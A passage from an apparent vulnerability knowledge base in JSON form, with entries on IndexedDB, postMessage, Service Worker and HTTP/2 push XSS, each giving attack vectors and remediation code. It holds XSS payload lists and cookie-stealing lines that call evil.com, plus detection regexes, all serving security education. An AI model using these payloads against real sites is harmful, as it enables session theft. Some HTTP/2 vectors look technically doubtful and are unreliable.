limits:\n\n   const MAX_DB_SIZE = 50 * 1024 * 1024;  // 50MB\n   const MAX_RECORD_SIZE = 1024 * 1024;   // 1MB per record\n\n   function checkStorageQuota() {\n     if ('storage' in navigator && 'estimate' in navigator.storage) {\n       navigator.storage.estimate().then(function(estimate) {\n         if (estimate.usage > MAX_DB_SIZE) {\n           cleanupOldData();\n         }\n       });\n     }\n   }\n\n10. SECURE DEFAULT VALUES:\n    Use safe defaults:\n\n    const DEFAULT_SETTINGS = {\n      theme: 'light',\n      language: 'en',\n      notifications: true,\n      customCSS: ''  // Empty, not null\n    };\n\n11. REGULAR DATA CLEANUP:\n    Implement data cleanup routines:\n\n    function cleanupMaliciousData() {\n      const transaction = db.transaction(['users'], 'readwrite');\n      const store = transaction.objectStore('users');\n\n      store.openCursor().onsuccess = function(event) {\n        const cursor = event.target.result;\n        if (cursor) {\n          const user = cursor.value;\n\n          // Check for malicious content\n          if (containsMaliciousContent(user.name)) {\n            // Sanitize or remove\n            user.name = sanitizeContent(user.name);\n            cursor.update(user);\n          }\n\n          cursor.continue();\n        }\n      };\n    }\n\n12. CSP FOR INDEXEDDB APPLICATIONS:\n    Content Security Policy:\n\n    Content-Security-Policy:\n      default-src 'self';\n      script-src 'self' 'nonce-{random}';\n      style-src 'self' 'unsafe-inline';  // If custom CSS is needed\n      img-src 'self' data: blob:;\n      connect-src 'self';\n      object-src 'none';\n\n13. OFFLINE SECURITY:\n    Secure offline functionality:\n\n    // Validate data when coming online\n    window.addEventListener('online', function() {\n      validateAllStoredData();\n      syncWithServer();\n    });\n\n14. LOGGING AND MONITORING:\n    Comprehensive IndexedDB monitoring:\n\n    function logDatabaseOperation(operation, details) {\n      logger.info('IndexedDB operation', {\n        operation: operation,\n        details: details,\n        timestamp: new Date().toISOString(),\n        userId: currentUser.id\n      });\n    }\n\n15. TESTING AND VALIDATION:\n    Regular security testing:\n\n    Automated tests:\n    - IndexedDB content validation\n    - Storage and retrieval testing\n    - Offline functionality testing\n    - Data sanitization testing\n\n    Manual tests:\n    - DevTools Application > IndexedDB inspection\n    - Data storage and display testing\n    - Offline behavior testing\n\nSECURITY TESTING PAYLOADS:\n\nBasic IndexedDB XSS:\n<script>alert('IndexedDB XSS')</script>\n<img src=x onerror=alert(1)>\n<svg onload=alert(1)>\n\nStorage-specific payloads:\n{\"name\": \"<script>alert(1)</script>\", \"email\": \"test@example.com\"}\n{\"content\": \"<script>alert(1)</script>\", \"type\": \"text\"}\n{\"customCSS\": \"body{background:url('javascript:alert(1)')}\"}\n\nAdvanced payloads:\njavascript:/*--></title></style></textarea></script></xmp><svg/onload=alert(1)>\ndata:text/html,<script>alert(1)</script>\nvbscript:msgbox(1)\n\nINDEXEDDB SECURITY HEADERS:\n\nCache-Control: no-cache\nContent-Security-Policy: default-src 'self'\nX-Content-Type-Options: nosniff\n\nMONITORING METRICS:\n\nMonitor for:\n- Unusual data storage patterns\n- Large data insertions\n- Frequent database operations\n- Storage quota violations\n- Data validation failures\n\nOWASP REFERENCES:\n- OWASP Client-Side Storage Security\n- OWASP HTML5 Security Cheat Sheet\n- IndexedDB Security Best Practices\n- Browser Storage Security Guide\n"
  },
  "postmessage_xss": {
    "title": "Cross-Site Scripting via PostMessage API",
    "severity": "high",
    "cvss_score": 7.4,
    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:L",
    "reliability": "certain",
    "cwe": [
      "CWE-79"
    ],
    "owasp": [
      "A03:2021"
    ],
    "tags": [
      "xss",
      "postmessage",
      "cross-origin",
      "api",
      "modern-web"
    ],
    "description": "\nThe postMessage API enables cross-origin communication between windows. Vulnerabilities occur when \napplications receive postMessage data without validating the origin or sanitizing content before using \nit in dangerous contexts. Increasingly common in modern web applications using micro-frontends and \nthird-party integrations.\n\nSEVERITY: HIGH\nCommon in OAuth flows, embedded widgets, and cross-origin integrations.\n",
    "attack_vector": "\nMISSING ORIGIN VALIDATION:\nwindow.addEventListener('message', function(e) {\n    element.innerHTML = e.data; // No origin check\n});\nAttacker sends: targetWindow.postMessage('<img src=x onerror=alert(1)>', '*');\n\nWEAK ORIGIN CHECK:\nif(e.origin.includes('trusted.com')) // Allows subtrusted.com or trusted.com.evil.com\n\nUSING DATA IN DANGEROUS SINKS:\neval(e.data)\ndocument.write(e.data)\nlocation.href = e.data\nnew Function(e.data)\n\nREGEX BYPASS:\n/^https?:\\/\\/trusted\\.com/.test(e.origin) // Can be bypassed\n\nWILDCARD ORIGINS:\ntargetWindow.postMessage(data, '*') // Any origin can receive\n\nJSON PARSING WITHOUT VALIDATION:\nconst obj = JSON.parse(e.data);\nelement.innerHTML = obj.html; // Unsafe\n\nOAUTH TOKEN THEFT:\nparent.postMessage(accessToken, '*'); // Leaks to any origin\n",
    "remediation": "\nDEFENSE:\n\n1. ALWAYS VALIDATE ORIGIN\n   window.addEventListener('message', function(e) {\n       if (e.origin !== 'https://trusted.com') {\n           return; // Reject\n       }\n       processMessage(e.data);\n   });\n\n2. USE EXACT COMPARISON\n   Never use: .includes(), .indexOf(), regex\n   Always use: === for origin check\n\n3. SANITIZE MESSAGE CONTENT\n   Treat postMessage data as untrusted user input\n\n4. NEVER USE IN DANGEROUS SINKS\n   No: eval(), Function(), innerHTML, location.href\n\n5. SPECIFY EXACT TARGET ORIGIN\n   targetWindow.postMessage(data, 'https://exact-origin.com');\n   Never: '*'\n\n6. VALIDATE MESSAGE STRUCTURE\n   Check message type, validate JSON schema\n\n7. IMPLEMENT RATE LIMITING\n\n8. USE CSP\n\n9. MESSAGE SIGNING/ENCRYPTION\n   For sensitive data\n\nExample:\nwindow.addEventListener('message', function(e) {\n    // Validate origin\n    if (e.origin !== 'https://trusted.com') {\n        return;\n    }\n    \n    // Validate message structure\n    if (typeof e.data !== 'object' || !e.data.type) {\n        return;\n    }\n    \n    // Whitelist allowed message types\n    const allowedTypes = ['update', 'refresh'];\n    if (!allowedTypes.includes(e.data.type)) {\n        return;\n    }\n    \n    // Sanitize before use\n    const sanitizedData = DOMPurify.sanitize(e.data.content);\n    processMessage(sanitizedData);\n});\n\nTOOLS:\n- Browser DevTools for monitoring postMessage\n- Burp Suite for intercepting messages\n- DOM Invader\n\nOWASP REFERENCES:\n- CWE-79: Cross-site Scripting\n- CWE-940: Improper Verification of Source\n- Web Messaging Security\n"
  },
  "service_worker_xss": {
    "title": "Cross-Site Scripting (XSS) in Service Worker Context",
    "severity": "high",
    "cvss_score": 7.8,
    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H",
    "reliability": "certain",
    "cwe": [
      "CWE-79"
    ],
    "owasp": [
      "A03:2021"
    ],
    "tags": [
      "xss",
      "service-worker",
      "pwa",
      "background-script",
      "modern-web"
    ],
    "description": "\nService Worker XSS occurs when user input is reflected into Service Worker scripts without proper\nsanitization. Service Workers are background scripts that run independently of web pages, intercepting\nnetwork requests, caching resources, and providing offline functionality. When malicious code is\ninjected into Service Worker scripts, it can execute with elevated privileges and persist across\nbrowser sessions.\n\nVULNERABILITY CONTEXT:\nService Worker XSS typically happens when:\n1. Dynamic Service Worker registration with user-controlled URLs\n2. Service Worker scripts generated from user templates\n3. Cache manipulation with malicious responses\n4. Push notification content injection\n5. Background sync data manipulation\n6. Offline page generation with user content\n\nCommon in:\n- Progressive Web Apps (PWA)\n- Offline-first applications\n- Caching layers\n- Push notification systems\n- Background synchronization\n- Template-based applications\n- CDN configurations\n- Mobile applications\n\nSEVERITY: HIGH\nService Workers run in the background with elevated privileges, can intercept all network requests,\nmanipulate cache, and persist malicious code across browser sessions and even offline usage.\n",
    "attack_vector": "\nSERVICE WORKER XSS ATTACK VECTORS:\n\n1. DYNAMIC REGISTRATION INJECTION:\n   Server-side registration:\n   navigator.serviceWorker.register('/sw.js?user=' + USER_INPUT);\n\n   Attack payload:\n   <script>alert(1)</script>\n\n   Result: Service Worker URL becomes /sw.js?user=<script>alert(1)</script>\n\n2. SERVICE WORKER SCRIPT INJECTION:\n   Server generates Service Worker:\n   self.addEventListener('install', function(event) {\n     event.waitUntil(\n       caches.open('USER_CACHE').then(function(cache) {\n         return cache.addAll([\n           '/index.html',\n           '/manifest.json',\n           USER_INPUT  // Injected URL\n         ]);\n       })\n     );\n   });\n\n   Attack payload:\n   data:text/javascript,fetch('http://evil.com/steal?c='+document.cookie)\n\n3. CACHE MANIPULATION:\n   Service Worker caches malicious content:\n   caches.open('v1').then(function(cache) {\n     cache.put('/api/user', new Response('<script>alert(1)</script>', {\n       headers: {'Content-Type': 'application/json'}\n     }));\n   });\n\n4. PUSH NOTIFICATION INJECTION:\n   self.addEventListener('push', function(event) {\n     const options = {\n       body: USER_INPUT,  // Notification body\n       icon: '/icon.png',\n       badge: '/badge.png'\n     };\n     event.waitUntil(\n       self.registration.showNotification('New Message', options)\n     );\n   });\n\n   Attack payload:\n   <script>alert(1)</script>\n\n5. BACKGROUND SYNC INJECTION:\n   self.addEventListener('sync', function(event) {\n     if (event.tag == 'background-sync') {\n       event.waitUntil(\n         fetch('/api/sync', {\n           method: 'POST',\n           body: JSON.stringify({data: USER_INPUT})  // Injected data\n         })\n       );\n     }\n   });\n\n6. FETCH EVENT INTERCEPTION:\n   self.addEventListener('fetch', function(event) {\n     if (event.request.url.includes('/api/user')) {\n       event.respondWith(\n         fetch(event.request).then(function(response) {\n           return response.text().then(function(text) {\n             return new Response(text + USER_INPUT, response);  // Injection\n           });\n         })\n       );\n     }\n   });\n\nADVANCED SERVICE WORKER ATTACKS:\n\n7. PERSISTENT CODE EXECUTION:\n   Service Worker installs malicious cache:\n   self.addEventListener('install', function(event) {\n     event.waitUntil(\n       caches.open('malicious-cache').then(function(cache) {\n         return cache.addAll([\n           'data:text/html,<script>alert(1)</script>'\n         ]);\n       })\n     );\n   });\n\n8. OFFLINE PAGE INJECTION:\n   self.addEventListener('fetch', function(event) {\n     event.respondWith(\n       caches.match('/offline.html').then(function(response) {\n         return response || new Response(USER_INPUT);  // Offline XSS\n       })\n     );\n   });\n\n9. MANIFEST INJECTION:\n   Service Worker updates manifest:\n   caches.open('manifest').then(function(cache) {\n     cache.put('/manifest.json', new Response(JSON.stringify({\n       name: 'App',\n       start_url: USER_INPUT  // Injected start URL\n     })));\n   });\n\n10. MESSAGE PASSAGE ATTACK:\n    Communication between page and Service Worker:\n    navigator.serviceWorker.controller.postMessage(USER_INPUT);\n\n    Service Worker receives:\n    self.addEventListener('message', function(event) {\n      // event.data contains XSS payload\n    });\n\n11. INSTALLATION EVENT ABUSE:\n    self.addEventListener('install', function(event) {\n      event.waitUntil(\n        fetch(USER_INPUT).then(function(response) {  // Remote code execution\n          return response.text();\n        }).then(function(script) {\n          eval(script);  // Code execution\n        })\n      );\n    });\n\n12. ACTIVATION PERSISTENCE:\n    Service Worker activates and persists:\n    self.addEventListener('activate', function(event) {\n      event.waitUntil(\n        clients.claim().then(function() {\n          // Inject script into all open pages\n          return clients.matchAll().then(function(clients) {\n            clients.forEach(function(client) {\n              client.postMessage('<script>alert(1)</script>');\n            });\n          });\n        })\n      );\n    });\n\nSERVICE WORKER SPECIFIC BYPASSES:\n\n13. SCOPE MANIPULATION:\n    Service Worker registration with broad scope:\n    navigator.serviceWorker.register('/sw.js', {scope: '/'});\n\n    Then inject into any page on domain\n\n14. UPDATE MECHANISM ABUSE:\n    Force Service Worker update with malicious version:\n    navigator.serviceWorker.register('/sw-v2.js?xss=<script>alert(1)</script>');\n\n15. UNINSTALLATION PREVENTION:\n    Service Worker prevents uninstallation:\n    self.addEventListener('beforeunload', function(event) {\n      event.preventDefault();\n      // Malicious code persists\n    });\n\n16. CLIENT CLAIM ATTACK:\n    Service Worker claims all clients immediately:\n    self.addEventListener('activate', function(event) {\n      event.waitUntil(clients.claim());\n    });\n\n    Then sends malicious messages to all pages\n\n17. CACHE POISONING:\n    Service Worker poisons cache with malicious responses:\n    caches.open('v1').then(function(cache) {\n      return cache.put('/api/data', new Response('<script>alert(1)</script>'));\n    });\n\n18. OFFLINE FALLBACK INJECTION:\n    self.addEventListener('fetch', function(event) {\n      event.respondWith(\n        fetch(event.request).catch(function() {\n          return caches.match('/offline.html').then(function(response) {\n            return new Response(response.text() + USER_INPUT);  // Offline XSS\n          });\n        })\n      );\n    });\n\nREAL-WORLD ATTACK SCENARIOS:\n\n19. PWA CHAT APPLICATION:\n    - Service Worker handles offline messages\n    - User message: <script>alert(1)</script>\n    - Cached for offline use\n    - Executes when user goes offline\n\n20. E-COMMERCE PWA:\n    - Service Worker caches product pages\n    - Product name: <script>alert(1)</script>\n    - Cached malicious content\n    - Affects all users offline\n\n21. BANKING APPLICATION:\n    - Service Worker handles transactions offline\n    - Transaction memo: <script>stealCredentials()</script>\n    - Persistent credential theft\n\n22. SOCIAL MEDIA PWA:\n    - Service Worker manages notifications\n    - Notification content: <script>alert(1)</script>\n    - Real-time XSS via push notifications\n\n23. COLLABORATIVE PLATFORM:\n    - Service Worker syncs documents\n    - Document content: <script>alert(1)</script>\n    - Affects all collaborators\n\n24. IOT CONTROL PANEL:\n    - Service Worker caches device states\n    - Device name: <script>alert(1)</script>\n    - Device hijacking via cache\n\nSERVICE WORKER DETECTION:\n\n25. MANUAL TESTING:\n    - Check Application tab in DevTools\n    - Monitor Service Worker registration\n    - Test offline functionality\n    - Check cached content\n\n26. AUTOMATED SCANNING:\n    - Register test Service Workers\n    - Send malicious payloads\n    - Monitor for script execution\n    - Test cache manipulation\n\n27. BROWSER EXTENSIONS:\n    - Service Worker interception\n    - Payload injection testing\n    - Offline behavior analysis\n",
    "remediation": "\nSERVICE WORKER XSS DEFENSE STRATEGY:\n\n1. SERVICE WORKER URL VALIDATION (PRIMARY DEFENSE):\n   Validate Service Worker registration URLs:\n\n   JavaScript validation:\n   function isValidServiceWorkerUrl(url) {\n     const allowedDomains = ['yourdomain.com', 'cdn.yourdomain.com'];\n     const allowedPaths = ['/sw.js', '/service-worker.js'];\n\n     try {\n       const urlObj = new URL(url, location.origin);\n       return allowedDomains.includes(urlObj.hostname) &&\n              allowedPaths.includes(urlObj.pathname);\n     } catch {\n       return false;\n     }\n   }\n\n2. DYNAMIC SERVICE WORKER RESTRICTIONS:\n   Avoid dynamic Service Worker registration with user input:\n\n   // BAD - Vulnerable to injection\n   navigator.serviceWorker.register(userInput);\n\n   // GOOD - Static registration\n   navigator.serviceWorker.register('/static/sw.js');\n\n3. SERVICE WORKER SCRIPT SANITIZATION:\n   Sanitize Service Worker script content:\n\n   const DOMPurify = require('dompurify');\n   const cleanScript = DOMPurify.sanitize(scriptContent, {\n     ALLOWED_TAGS: [],\n     ALLOWED_ATTR: []\n   });\n\n4. CACHE CONTENT VALIDATION:\n   Validate cached content before serving:\n\n   self.addEventListener('fetch', function(event) {\n     event.respondWith(\n       caches.match(event.request).then(function(response) {\n         if (response) {\n           return response.text().then(function(text) {\n             // Validate cached content\n             const cleanText = DOMPurify.sanitize(text);\n             return new Response(cleanText, response);\n           });\n         }\n         return fetch(event.request);\n       })\n     );\n   });\n\n5. PUSH NOTIFICATION SANITIZATION:\n   Sanitize push notification content:\n\n   self.addEventListener('push', function(event) {\n     const data = event.data.json();\n     const cleanBody = DOMPurify.sanitize(data.body);\n\n     const options = {\n       body: cleanBody,\n       icon: validateUrl(data.icon),\n       badge: validateUrl(data.badge)\n     };\n   });\n\n6. BACKGROUND SYNC VALIDATION:\n   Validate background sync data:\n\n   self.addEventListener('sync', function(event) {\n     event.waitUntil(\n       validateAndProcessData(event.tag)\n     );\n   });\n\n   function validateAndProcessData(tag) {\n     return new Promise(function(resolve, reject) {\n       // Validate sync data before processing\n       const cleanData = DOMPurify.sanitize(syncData);\n       // Process only validated data\n       resolve(cleanData);\n     });\n   }\n\n7. MESSAGE VALIDATION:\n   Validate messages between page and Service Worker:\n\n   self.addEventListener('message', function(event) {\n     const data = event.data;\n\n     // Validate message structure and content\n     if (isValidMessage(data)) {\n       processMessage(data);\n     }\n   });\n\n   function isValidMessage(data) {\n     // Strict validation of message structure\n     return typeof data === 'object' &&\n            data.type in ALLOWED_MESSAGE_TYPES &&\n            typeof data.content === 'string' &&\n            data.content.length < 1000;\n   }\n\n8. SCOPE RESTRICTIONS:\n   Limit Service Worker scope:\n\n   navigator.serviceWorker.register('/sw.js', {\n     scope: '/app/'  // Restrict to specific path\n   });\n\n9. UPDATE VALIDATION:\n   Validate Service Worker updates:\n\n   self.addEventListener('install', function(event) {\n     self.skipWaiting();  // Only if update is validated\n   });\n\n10. CLIENT VERIFICATION:\n    Verify client origins:\n\n    clients.matchAll().then(function(clients) {\n      clients.forEach(function(client) {\n        if (!isAllowedOrigin(client.url)) {\n          client.close();  // Close unauthorized clients\n        }\n      });\n    });\n\n11. OFFLINE CONTENT SANITIZATION:\n    Sanitize offline page content:\n\n    self.addEventListener('fetch', function(event) {\n      if (event.request.mode === 'navigate') {\n        event.respondWith(\n          caches.match('/offline.html').then(function(response) {\n            return response.text().then(function(text) {\n              const cleanText = DOMPurify.sanitize(text);\n              return new Response(cleanText, {\n                headers: {'Content-Type': 'text/html'}\n              });\n            });\n          })\n        );\n      }\n    });\n\n12. CSP FOR SERVICE WORKERS:\n    Content Security Policy restrictions:\n\n    Content-Security-Policy:\n      default-src 'self';\n      script-src 'self' 'nonce-{random}';\n      connect-src 'self';\n      object-src 'none';\n      worker-src 'self';\n\n13. SERVICE WORKER DESTRUCTION:\n    Proper cleanup on logout:\n\n    navigator.serviceWorker.getRegistration().then(function(registration) {\n      if (registration) {\n        registration.unregister().then(function(success) {\n          if (success) {\n            // Clear all caches\n            caches.keys().then(function(names) {\n              names.forEach(function(name) {\n                caches.delete(name);\n              });\n            });\n          }\n        });\n      }\n    });\n\n14. MONITORING AND LOGGING:\n    Comprehensive Service Worker monitoring:\n\n    self.addEventListener('install', function(event) {\n      console.log('SW installing:', new Date().toISOString());\n    });\n\n    self.addEventListener('activate', function(event) {\n      console.log('SW activating:', new Date().toISOString());\n    });\n\n15. VERSION CONTROL:\n    Service Worker versioning:\n\n    const CACHE_VERSION = 'v1.0.0';\n    const CACHE_NAME = 'app-cache-' + CACHE_VERSION;\n\n    self.addEventListener('install', function(event) {\n      event.waitUntil(\n        caches.open(CACHE_NAME).then(function(cache) {\n          // Cache validation here\n          return cache.addAll(VALIDATED_URLS);\n        })\n      );\n    });\n\n16. TESTING AND VALIDATION:\n    Regular security testing:\n\n    Automated tests:\n    - Service Worker registration testing\n    - Cache content validation\n    - Offline functionality testing\n    - Push notification security testing\n\n    Manual testing:\n    - DevTools Application tab inspection\n    - Service Worker script analysis\n    - Cache content verification\n    - Offline behavior testing\n\nSECURITY TESTING PAYLOADS:\n\nBasic detection:\n<script>alert('Service Worker XSS')</script>\n<img src=x onerror=alert(1)>\n<svg onload=alert(1)>\n\nService Worker specific:\ndata:text/javascript,self.addEventListener('install',function(){fetch('http://evil.com/steal')})\ndata:text/javascript,eval('alert(1)')\ndata:text/html,<script>alert(1)</script>\n\nBypass attempts:\n{{constructor.constructor('alert(1)')()}}\njavascript:alert(1)\nvbscript:msgbox(1)\n\nSERVICE WORKER SECURITY HEADERS:\n\nService-Worker-Allowed: /app/\nCache-Control: no-cache\nContent-Security-Policy: worker-src 'self'\n\nMONITORING METRICS:\n\nTrack and alert on:\n- Service Worker registration failures\n- Cache corruption attempts\n- Push notification abuse\n- Background sync anomalies\n- Message validation failures\n\nOWASP REFERENCES:\n- OWASP PWA Security\n- OWASP Service Worker Security\n- Service Workers 1 Specification\n- Progressive Web Apps Security\n"
  },
  "http2_push_xss": {
    "title": "Cross-Site Scripting (XSS) in HTTP/2 Push Context",
    "severity": "medium",
    "cvss_score": 6.8,
    "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:N",
    "reliability": "certain",
    "cwe": [
      "CWE-79"
    ],
    "owasp": [
      "A03:2021"
    ],
    "tags": [
      "xss",
      "http2",
      "server-push",
      "resource-injection",
      "modern-web"
    ],
    "description": "\nHTTP/2 Push XSS occurs when user input is reflected into HTTP/2 Server Push resources or when\npush promises contain malicious content. HTTP/2 Server Push allows servers to proactively send\nresources to clients before they are requested, improving performance. However, when push promises\nor pushed content contain user-controlled data without sanitization, it can lead to XSS attacks\nthrough pushed resources.\n\nVULNERABILITY CONTEXT:\nHTTP/2 Push XSS typically happens when:\n1. Push promise paths contain user input\n2. Pushed content includes user-generated data\n3. Push resource URLs are dynamically generated\n4. Push headers contain reflected content\n5. Push content is cached and later served\n6. Push resources are generated from templates\n\nCommon in:\n- HTTP/2 enabled web servers\n- CDN configurations with push\n- Performance optimization systems\n- Caching layers\n- Template-based applications\n- Resource bundling systems\n- API response optimization\n\nSEVERITY: MEDIUM\nHTTP/2 Push XSS requires specific server configuration and user interaction. However, successful\nexploitation can lead to persistent attacks through cached resources and affect multiple users\nthrough server-initiated content delivery.\n",
    "attack_vector": "\nHTTP/2 PUSH XSS ATTACK VECTORS:\n\n1. PUSH PATH INJECTION:\n   Server push with user-controlled paths:\n   server.push('/api/user/' + USER_INPUT);  // Path injection\n\n   Attack payload:\n   <script>alert(1)</script>\n\n   Result: Server pushes /api/user/<script>alert(1)</script>\n\n2. PUSH CONTENT INJECTION:\n   Pushed resource content:\n   const pushContent = '<!DOCTYPE html><html><body>' +\n                       '<h1>Welcome, ' + USER_INPUT + '</h1>' +  // Content injection\n                       '</body></html>';\n\n   server.push('/welcome.html', pushContent);\n\n3. PUSH HEADER INJECTION:\n   HTTP/2 push headers:\n   server.push('/user.css', cssContent, {\n     'content-type': 'text/css',\n     'x-user-name': USER_INPUT  // Header injection\n   });\n\n4. PUSH PROMISE INJECTION:\n   Promise path injection:\n   const promisePath = '/user/' + USER_INPUT + '/profile';  // Promise injection\n   server.push(promisePath);\n\n5. PUSH RESOURCE GENERATION:\n   Dynamic resource generation:\n   const resourcePath = '/generated/' + USER_INPUT + '.js';  // Resource path XSS\n   const resourceContent = 'console.log(\"' + USER_INPUT + '\");';  // Content XSS\n\n   server.push(resourcePath, resourceContent);\n\nADVANCED HTTP/2 PUSH XSS TECHNIQUES:\n\n6. PUSH DEPENDENCY INJECTION:\n   Push dependency chains with XSS:\n   server.push('/main.js', mainScript);\n   server.push('/user-data.js', 'var userData = \"' + USER_INPUT + '\";');  // Dependency XSS\n\n7. PUSH CACHE INJECTION:\n   Cache manipulation with XSS:\n   const cacheKey = 'user_' + USER_INPUT;  // Cache key injection\n   const cachedContent = generateContent(USER_INPUT);  // Content injection\n\n   server.push('/cached/' + cacheKey + '.html', cachedContent);\n\n8. PUSH STREAM PRIORITY INJECTION:\n   Stream priority with XSS:\n   server.push('/priority-high.js', highPriorityScript, {\n     priority: USER_INPUT  // Priority injection\n   });\n\n9. PUSH SETTINGS INJECTION:\n   HTTP/2 settings frame manipulation:\n   const maliciousSettings = {\n     SETTINGS_HEADER_TABLE_SIZE: 4096,\n     SETTINGS_ENABLE_PUSH: 1,\n     SETTINGS_MAX_CONCURRENT_STREAMS: USER_INPUT  // Settings XSS\n   };\n\n10. PUSH CONTINUATION FRAME INJECTION:\n    HTTP/2 continuation frames with XSS:\n    const continuationData = USER_INPUT;  // Continuation injection\n    server.push('/continuation.js', continuationData);\n\n11. PUSH RESET FRAME ATTACK:\n    Reset frames with malicious data:\n    const resetReason = USER_INPUT;  // Reset reason XSS\n    server.resetStream(streamId, resetReason);\n\n12. PUSH WINDOW UPDATE INJECTION:\n    Window update with XSS:\n    const windowSize = parseInt(USER_INPUT);  // Window size injection\n    server.updateWindow(windowSize);\n\n13. PUSH PRIORITY FRAME INJECTION:\n    Priority frame manipulation:\n    const priorityData = {\n      streamId: 1,\n      weight: 256,\n      dependency: USER_INPUT  // Dependency injection\n    };\n\n14. PUSH GOAWAY FRAME ATTACK:\n    GoAway frames with XSS:\n    const goAwayData = {\n      lastStreamId: 0,\n      errorCode: 0,\n      debugData: USER_INPUT  // Debug data XSS\n    };\n\n15. PUSH ALTSVC FRAME INJECTION:\n    Alternative service injection:\n    const altSvcData = 'h2=\":443\"; ' + USER_INPUT;  // Alt-Svc XSS\n\nHTTP/2 PUSH-SPECIFIC BYPASSES:\n\n16. PUSH PROMISE PAD LENGTH ATTACK:\n    Padding manipulation:\n    const paddedPath = '/user/' + USER_INPUT + '/' + 'x'.repeat(255);  // Pad length XSS\n\n17. PUSH SETTINGS ACK INJECTION:\n    Settings acknowledgment with XSS:\n    const settingsAck = USER_INPUT;  // Settings ack XSS\n\n18. PUSH PRIORITY EXCLUSIVE INJECTION:\n    Priority exclusive flag with XSS:\n    const exclusivePriority = {\n      streamId: USER_INPUT,  // Exclusive injection\n      weight: 128,\n      exclusive: true\n    };\n\n19. PUSH WINDOW SIZE INCREMENT ATTACK:\n    Window size manipulation:\n    const windowIncrement = USER_INPUT;  // Window increment XSS\n\n20. PUSH HEADERS COMPRESSION ATTACK:\n    HPACK compression with XSS:\n    const compressedHeaders = hpack.encode({\n      ':path': '/user/' + USER_INPUT,  // Compressed path XSS\n      ':method': 'GET'\n    });\n\nREAL-WORLD ATTACK SCENARIOS:\n\n21. RESOURCE PRELOADING ATTACK:\n    - Server preloads user-specific resources\n    - Resource path: /user/<script>alert(1)</script>/data.js\n    - Pushed to all users\n    - Global XSS execution\n\n22. CACHING LAYER ATTACK:\n    - CDN with HTTP/2 push\n    - Push path: /api/user/<script>alert(1)</script>\n    - Cached malicious content\n    - Served to all CDN users\n\n23. PERSONALIZATION ENGINE:\n    - Personalized content delivery\n    - Push content: Welcome <script>alert(1)</script>!\n    - Pushed to user browsers\n    - Personalized XSS attacks\n\n24. API RESPONSE OPTIMIZATION:\n    - API with push optimization\n    - Push related data: /user/<script>alert(1)</script>/profile\n    - API response includes XSS\n    - Affects API consumers\n\n25. TEMPLATE PUSHING:\n    - Server-side template rendering\n    - Push template: /template/<script>alert(1)</script>.html\n    - Template served to users\n    - Template-based XSS\n\n26. STATIC ASSET PUSHING:\n    - Static asset optimization\n    - Push asset: /assets/<script>alert(1)</script>.css\n    - CSS with XSS payload\n    - Style-based attacks\n\n27. LOCALIZATION PUSHING:\n    - Multi-language content\n    - Push locale: /locale/<script>alert(1)</script>.json\n    - Localized XSS attacks\n    - Language-specific attacks\n\nHTTP/2 PUSH XSS DETECTION:\n\n28. MANUAL TESTING:\n    - Browser DevTools Network inspection\n    - HTTP/2 push monitoring\n    - Server push analysis\n    - Resource content inspection\n\n29. AUTOMATED SCANNING:\n    - HTTP/2 push analysis\n    - Push promise validation\n    - Pushed content security testing\n    - Cache poisoning detection\n\n30. PROXY MONITORING:\n    - HTTP/2 traffic interception\n    - Push promise monitoring\n    - Content validation\n    - Compression analysis\n",
    "remediation": "\nHTTP/2 PUSH XSS DEFENSE STRATEGY:\n\n1. PUSH PATH VALIDATION (PRIMARY DEFENSE):\n   Validate all push promise paths:\n\n   function validatePushPath(path) {\n     // Path must start with allowed prefix\n     const allowedPrefixes = ['/api/', '/assets/', '/static/', '/public/'];\n     if (!allowedPrefixes.some(prefix => path.startsWith(prefix))) {\n       throw new Error('Invalid push path');\n     }\n\n     // Validate path format\n     const pathPattern = /^\\/[a-zA-Z0-9\\/_-]+$/;\n     if (!pathPattern.test(path)) {\n       throw new Error('Invalid path format');\n     }\n\n     // Check for XSS patterns\n     const dangerousPatterns = [\n       /<script\b[^<]*(?:(?!<\\/script>)<[^<]*)*<\\/script>/gi,\n       /javascript:/gi,\n       /vbscript:/gi,\n       /on\\w+\\s*=/gi,\n       /<[^>]*>/g\n     ];\n\n     for (const pattern of dangerousPatterns) {\n       if (pattern.test(path)) {\n         throw new Error('Malicious content in path');\n       }\n     }\n\n     return path;\n   }\n\n2. PUSH CONTENT SANITIZATION:\n   Sanitize all pushed content:\n\n   function sanitizePushContent(content, contentType) {\n     switch (contentType) {\n       case 'text/html':\n         return DOMPurify.sanitize(content);\n       case 'application/javascript':\n         return sanitizeJavaScript(content);\n       case 'text/css':\n         return sanitizeCSS(content);\n       case 'application/json':\n         return sanitizeJSON(content);\n       default:\n         return content;\n     }\n   }\n\n3. SERVER PUSH RESTRICTIONS:\n   Restrict server push functionality:\n\n   // Only allow push for specific resource types\n   const ALLOWED_PUSH_TYPES = ['text/css', 'application/javascript', 'image/*'];\n\n   function canPushResource(resourcePath, contentType) {\n     return ALLOWED_PUSH_TYPES.some(type => {\n       if (type.endsWith('/*')) {\n         return contentType.startsWith(type.slice(0, -1));\n       }\n       return contentType === type;\n     });\n   }\n\n4. PUSH HEADER VALIDATION:\n   Validate push headers:\n\n   function validatePushHeaders(headers) {\n     const allowedHeaders = [\n       'content-type',\n       'content-length',\n       'cache-control',\n       'etag',\n       'last-modified'\n     ];\n\n     for (const header in headers) {\n       if (!allowedHeaders.includes(header.toLowerCase())) {\n         throw new Error('Invalid push header: ' + header);\n       }\n\n       // Validate header values\n       const cleanValue = DOMPurify.sanitize(headers[header]);\n       headers[header] = cleanValue;\n     }\n\n     return headers;\n   }\n\n5. PUSH DEPENDENCY VALIDATION:\n   Validate push dependencies:\n\n   function validatePushDependencies(dependencies) {\n     return dependencies.every(dep => {\n       return validatePushPath(dep.path) &&\n              isValidContentType(dep.contentType) &&\n              dep.content.length < MAX_PUSH_SIZE;\n     });\n   }\n\n6. CACHE SECURITY:\n   Secure push cache handling:\n\n   function cachePushResource(path, content) {\n     const cleanPath = validatePushPath(path);\n     const cleanContent = sanitizePushContent(content, getContentType(cleanPath));\n\n     // Store with validation\n     cache.set(cleanPath, {\n       content: cleanContent,\n       timestamp: Date.now(),\n       validated: true\n     });\n   }\n\n7. RATE LIMITING:\n   Implement push rate limiting:\n\n   const pushLimits = new Map();\n\n   function canPushForUser(userId) {\n     const userPushes = 